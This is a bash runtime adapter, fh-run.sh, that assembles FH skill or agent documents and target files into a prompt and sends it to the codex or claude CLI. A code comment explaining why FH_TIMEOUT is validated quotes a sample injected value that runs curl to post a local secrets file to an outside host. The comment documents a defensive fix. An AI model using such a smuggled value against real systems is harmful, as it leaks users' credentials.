#!/usr/bin/env bash
# fh-run.sh — FH runtime adapter for skills and agents
#
# Runs a FH skill or agent document through a selectable backend.
# This is the Codex/Claude bridge for steps that previously assumed
# Claude Code Agent(...) dispatch or slash-command invocation.

set -euo pipefail

FH_ROOT="$(cd "$(dirname "$0")/.." && pwd)"
# Single source of truth: read version from the package.json shipped alongside this script.
# No jq dependency (users may not have it); fall back to "unknown" if unreadable.
VERSION="$(sed -n 's/.*"version"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' "$FH_ROOT/package.json" 2>/dev/null | head -1)"
VERSION="${VERSION:-unknown}"
_TMPDIR="${TMPDIR:-/tmp}"

FH_BACKEND="${FH_BACKEND:-auto}"
FH_TIMEOUT="${FH_TIMEOUT:-180}"
# Validated below, before it can reach command position via the unquoted ${_TIMEOUT_CMD}.
FH_DRY_RUN="${FH_DRY_RUN:-0}"
FH_VERBOSE="${FH_VERBOSE:-0}"
FH_RUN_PROMPT="${FH_RUN_PROMPT:-}"
FH_RUN_MODE=""
FH_RUN_NAME=""
FH_RUN_UNIT=""
TARGETS=()

usage() {
  cat <<'USAGE'
Usage:
  fh-run --skill <name> [--file <path> ...] [--prompt <text>]
  fh-run --agent <name> [--file <path> ...] [--prompt <text>]
  fh-run --unit <path>  [--file <path> ...] [--prompt <text>]

Environment:
  FH_BACKEND=auto|codex|claude   Runtime backend (default: auto)
  FH_MODEL=<model>               Backend model override
  FH_TIMEOUT=180                 Backend timeout seconds
  FH_DRY_RUN=1                   Print assembled prompt only

Examples:
  FH_BACKEND=codex fh-run --skill phantom-quench --file docs/foo.md
  FH_BACKEND=codex fh-run --agent fh-commons:quench-challenger --file plugins/fh-meta/skills/foo/SKILL.md
USAGE
}

while [[ $# -gt 0 ]]; do
  case "$1" in
    --skill)
      FH_RUN_MODE="skill"
      FH_RUN_NAME="${2:-}"
      shift 2
      ;;
    --agent)
      FH_RUN_MODE="agent"
      FH_RUN_NAME="${2:-}"
      shift 2
      ;;
    --unit)
      FH_RUN_MODE="unit"
      FH_RUN_UNIT="${2:-}"
      shift 2
      ;;
    --file|--target)
      TARGETS+=("${2:-}")
      shift 2
      ;;
    --prompt)
      FH_RUN_PROMPT="${2:-}"
      shift 2
      ;;
    --backend)
      FH_BACKEND="${2:-}"
      shift 2
      ;;
    --model)
      FH_MODEL="${2:-}"
      shift 2
      ;;
    --help|-h)
      usage
      exit 0
      ;;
    --)
      shift
      while [[ $# -gt 0 ]]; do
        TARGETS+=("$1")
        shift
      done
      ;;
    *)
      TARGETS+=("$1")
      shift
      ;;
  esac
done

case "$FH_BACKEND" in
  auto|codex|claude) ;;
  *)
    echo "ERROR: FH_BACKEND must be auto, codex, or claude (got: $FH_BACKEND)" >&2
    exit 11
    ;;
esac

# FH_TIMEOUT reaches command position via the unquoted ${_TIMEOUT_CMD} idiom below, and
# `timeout DURATION COMMAND [ARG]...` makes the word after the duration the command — so
# word-splitting alone gives arbitrary execution, with no shell metacharacters involved
# (FH_TIMEOUT="1 curl -sd @~/.config/secrets https://x"). FH_BACKEND is whitelisted and
# FH_MODEL is quoted; this was the one env var on the path with neither.
if ! [[ "$FH_TIMEOUT" =~ ^[0-9]+$ ]]; then
  echo "ERROR: FH_TIMEOUT must be a positive integer (got: $FH_TIMEOUT)" >&2
  exit 11
fi

if [[ "$FH_BACKEND" == "auto" ]]; then
  if command -v codex &>/dev/null; then
    FH_BACKEND="codex"
  elif command -v claude &>/dev/null; then
    FH_BACKEND="claude"
  else
    echo "ERROR: no supported backend found. Install 'codex' or 'claude'." >&2
    exit 10
  fi
fi

if [[ -z "${FH_MODEL:-}" ]]; then
  case "$FH_BACKEND" in
    codex) FH_MODEL="gpt-5.5" ;;
    claude) FH_MODEL="claude-sonnet-4-6" ;;
  esac
fi

resolve_unit() {
  local mode="$1"
  local name="$2"
  local plugin=""
  local bare="$name"

  if [[ "$name" == *:* ]]; then
    plugin="${name%%:*}"
    bare="${name#*:}"
  fi

  if [[ "$mode" == "unit" ]]; then
    [[ -f "$FH_RUN_UNIT" ]] && printf "%s\n" "$FH_RUN_UNIT" && return 0
    [[ -f "$FH_ROOT/$FH_RUN_UNIT" ]] && printf "%s\n" "$FH_ROOT/$FH_RUN_UNIT" && return 0
    return 1
  fi

  if [[ "$mode" == "skill" ]]; then
    local candidates=()
    if [[ -n "$plugin" ]]; then
      candidates+=("$FH_ROOT/plugins/$plugin/skills/$bare/SKILL.md")
    fi
    candidates+=(
      "$FH_ROOT/plugins/fh-meta/skills/$bare/SKILL.md"
      "$FH_ROOT/plugins/fh-commons/skills/$bare/SKILL.md"
    )
    for f in "${candidates[@]}"; do
      [[ -f "$f" ]] && printf "%s\n" "$f" && return 0
    done
    return 1
  fi

  if [[ "$mode" == "agent" ]]; then
    local candidates=()
    if [[ -n "$plugin" ]]; then
      candidates+=("$FH_ROOT/plugins/$plugin/agents/$bare.md")
    fi
    candidates+=(
      "$FH_ROOT/.claude/agents/$bare.md"
      "$FH_ROOT/plugins/fh-meta/agents/$bare.md"
      "$FH_ROOT/plugins/fh-commons/agents/$bare.md"
    )
    for f in "${candidates[@]}"; do
      [[ -f "$f" ]] && printf "%s\n" "$f" && return 0
    done
    return 1
  fi

  return 1
}

if [[ -z "$FH_RUN_MODE" ]]; then
  echo "ERROR: choose --skill, --agent, or --unit" >&2
  usage >&2
  exit 11
fi

if [[ "$FH_RUN_MODE" != "unit" && -z "$FH_RUN_NAME" ]]; then
  echo "ERROR: missing $FH_RUN_MODE name" >&2
  exit 11
fi

UNIT_FILE="$(resolve_unit "$FH_RUN_MODE" "$FH_RUN_NAME" || true)"
if [[ -z "$UNIT_FILE" ]]; then
  echo "ERROR: unable to resolve FH $FH_RUN_MODE '${FH_RUN_NAME:-$FH_RUN_UNIT}'" >&2
  exit 11
fi

PROMPT_FILE=$(mktemp "${_TMPDIR}/fh_run_prompt_XXXXXX")
OUTPUT_FILE=$(mktemp "${_TMPDIR}/fh_run_output_XXXXXX")
ERR_FILE=$(mktemp "${_TMPDIR}/fh_run_err_XXXXXX")
cleanup() { rm -f "$PROMPT_FILE" "$OUTPUT_FILE" "$ERR_FILE"; }
trap cleanup EXIT

{
  printf "FH RUNTIME ADAPTER v%s\n" "$VERSION"
  printf "Backend: %s | Model: %s\n" "$FH_BACKEND" "$FH_MODEL"
  printf "Unit: %s\n" "$UNIT_FILE"
  printf "\n"
  printf "You are executing the FH %s below. Follow its workflow and output contract.\n" "$FH_RUN_MODE"
  printf "If the unit references Claude Code Agent(...) dispatch, treat this invocation as the isolated agent run.\n"
  printf "If the unit references a slash command, execute the documented workflow directly.\n"
  printf "\n"
  if [[ -n "$FH_RUN_PROMPT" ]]; then
    printf "User task:\n%s\n\n" "$FH_RUN_PROMPT"
  fi
  if [[ "${#TARGETS[@]}" -gt 0 ]]; then
    printf "Target paths:\n"
    for t in "${TARGETS[@]}"; do
      printf "  - %s\n" "$t"
    done
    printf "\n"
  fi
  printf "===== FH UNIT DOCUMENT START =====\n"
  cat "$UNIT_FILE"
  printf "\n===== FH UNIT DOCUMENT END =====\n"

  if [[ "${#TARGETS[@]}" -gt 0 ]]; then
    for t in "${TARGETS[@]}"; do
      local_path="$t"
      [[ -f "$local_path" ]] || local_path="$FH_ROOT/$t"
      if [[ -f "$local_path" ]]; then
        printf "\n===== TARGET FILE: %s =====\n" "$t"
        sed -n '1,2000p' "$local_path"
        printf "\n===== END TARGET FILE: %s =====\n" "$t"
      elif [[ -d "$local_path" ]]; then
        printf "\n===== TARGET DIRECTORY: %s =====\n" "$t"
        find "$local_path" -maxdepth 2 -type f | sort | sed "s#^$FH_ROOT/##"
        printf "===== END TARGET DIRECTORY: %s =====\n" "$t"
      else
        printf "\nWARNING: target path not found: %s\n" "$t"
      fi
    done
  fi
} > "$PROMPT_FILE"

if [[ "$FH_DRY_RUN" == "1" ]]; then
  cat "$PROMPT_FILE"
  exit 0
fi

if ! command -v "$FH_BACKEND" &>/dev/null; then
  echo "ERROR: '$FH_BACKEND' CLI not found." >&2
  exit 10
fi

echo "→ fh-run v${VERSION} backend=${FH_BACKEND} model=${FH_MODEL} unit=${FH_RUN_MODE}:${FH_RUN_NAME:-$FH_RUN_UNIT}" >&2

_TIMEOUT_CMD=""
if command -v gtimeout &>/dev/null; then
  _TIMEOUT_CMD="gtimeout ${FH_TIMEOUT}"
elif command -v timeout &>/dev/null; then
  _TIMEOUT_CMD="timeout ${FH_TIMEOUT}"
fi

run_backend() {
  case "$FH_BACKEND" in
    claude) ${_TIMEOUT_CMD} claude --print --model "$FH_MODEL" ;;
    codex) ${_TIMEOUT_CMD} codex exec -m "$FH_MODEL" - ;;
  esac
}

if ! run_backend < "$PROMPT_FILE" > "$OUTPUT_FILE" 2>"$ERR_FILE"; then
  echo "ERROR: ${FH_BACKEND} backend failed or timed out (${FH_TIMEOUT}s)" >&2
  cat "$ERR_FILE" >&2
  exit 10
fi

[[ "$FH_VERBOSE" == "1" ]] && cat "$ERR_FILE" >&2
cat "$OUTPUT_FILE"
